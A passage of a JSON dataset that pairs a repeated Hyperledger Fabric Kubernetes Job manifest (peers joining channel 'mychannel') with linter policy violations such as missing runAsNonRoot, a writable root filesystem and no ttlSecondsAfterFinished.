    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "9124",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel1\" does not have a read-only root file system"
  },
  {
    "id": "9125",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel2\" does not have a read-only root file system"
  },
  {
    "id": "9126",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel3\" does not have a read-only root file system"
  },
  {
    "id": "9127",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"joinchannel4\" does not have a read-only root file system"
  },
  {
    "id": "9128",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer0.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org2:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2/users/Admin@org2/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org2/peers/peer1.org2/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"joinchannel1\" is not set to runAsNonRoot"
  },
  {
    "id": "9129",
    "manifest_path": "data/manifests/the_stack_sample/sample_3450.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  namespace: fabric\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer0.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer0.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.1.0\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: mychannel\n        - name: ORDERER_URL\n          value: orderer0.ordererorg1:7050\n        - name: CORE_PEER_ADDRESS\n          value: peer1.org1:7051\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1/users/Admin@org1/msp\n        - name: CORE_PEER_TLS_ROOTCERT_FILE\n          value: /shared/crypto-config/peerOrganizations/org1/peers/peer1.org1/tls/ca.crt\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          